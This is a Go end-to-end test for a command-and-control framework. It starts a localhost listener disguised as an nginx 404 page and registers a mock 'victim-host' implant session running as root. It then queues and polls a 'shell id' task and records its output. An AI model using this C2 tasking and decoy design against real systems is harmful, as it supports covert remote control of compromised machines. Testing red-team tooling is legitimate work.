package c2

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"testing"
	"time"

	"github.com/RestXtra/RestXtraAI/db"
)

func TestListenerBeaconE2E(t *testing.T) {
	dsn := os.Getenv("RESTXTRA_PG_DSN")
	if dsn == "" {
		t.Skip("RESTXTRA_PG_DSN not set")
	}
	d, err := db.Open(dsn)
	if err != nil {
		t.Skipf("postgres unavailable: %v", err)
	}
	defer d.Close()

	// free port
	lp, _ := net.Listen("tcp", "127.0.0.1:0")
	port := lp.Addr().(*net.TCPAddr).Port
	_ = lp.Close()

	lid, err := d.SaveC2Listener(&db.C2Listener{
		Name: "e2e", Protocol: "http", Host: "127.0.0.1", Port: port, Enabled: true, Status: "stopped",
		Disguise: []byte(`{"decoy_type":"nginx_404"}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		_ = d.DeleteC2Listener(lid)
		_, _ = d.ClearC2Sessions()
	}()

	m := New(d)
	if err := m.StartListener(&db.C2Listener{ID: lid, Name: "e2e", Protocol: "http", Host: "127.0.0.1", Port: port, Disguise: []byte(`{"decoy_type":"nginx_404"}`)}); err != nil {
		t.Fatal(err)
	}
	defer m.StopListener(lid)

	base := fmt.Sprintf("http://127.0.0.1:%d", port)

	// decoy on unknown path
	resp, err := http.Get(base + "/")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 404 {
		t.Fatalf("decoy expected 404, got %d", resp.StatusCode)
	}

	// register
	reg := map[string]any{"session_id": "e2e-sess", "host": "10.0.0.5", "hostname": "victim-host", "os": "linux", "arch": "amd64", "username": "root", "connection": "http"}
	if _, err := postJSON(base+"/register", reg); err != nil {
		t.Fatal(err)
	}

	// enqueue a task
	if _, err := d.CreateC2Task("e2e-sess", "shell id", "", nil); err != nil {
		t.Fatal(err)
	}

	// poll should claim the task
	pollResp, err := postJSON(base+"/poll", map[string]string{"session_id": "e2e-sess"})
	if err != nil {
		t.Fatal(err)
	}
	var pr struct {
		Tasks []struct {
			ID      int64  `json:"id"`
			Command string `json:"command"`
		} `json:"tasks"`
	}
	if err := json.Unmarshal(pollResp, &pr); err != nil {
		t.Fatal(err)
	}
	if len(pr.Tasks) != 1 || pr.Tasks[0].Command != "shell id" {
		t.Fatalf("poll tasks unexpected: %+v", pr.Tasks)
	}
	tid := pr.Tasks[0].ID

	// report result
	if _, err := postJSON(base+"/result", map[string]any{"task_id": tid, "output": "uid=0(root)"}); err != nil {
		t.Fatal(err)
	}

	// verify task state
	tasks, err := d.ListC2Tasks("e2e-sess", 5)
	if err != nil {
		t.Fatal(err)
	}
	if len(tasks) == 0 || tasks[0].State != "completed" {
		t.Fatalf("task state: %+v", tasks)
	}

	// session persisted with rich fields
	sess, err := d.ListC2Sessions(5)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, s := range sess {
		if s.SessionID == "e2e-sess" && s.Hostname == "victim-host" && s.OS == "linux" {
			found = true
		}
	}
	if !found {
		t.Fatal("registered session with rich fields not found")
	}

	// cleanup
	_, _ = d.ClearC2Sessions()
	time.Sleep(50 * time.Millisecond)
}

func postJSON(url string, v any) ([]byte, error) {
	b, _ := json.Marshal(v)
	resp, err := http.Post(url, "application/json", bytes.NewReader(b))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	out := make([]byte, 0, 4096)
	buf := make([]byte, 1024)
	for {
		n, err := resp.Body.Read(buf)
		out = append(out, buf[:n]...)
		if err != nil {
			break
		}
	}
	return out, nil
}
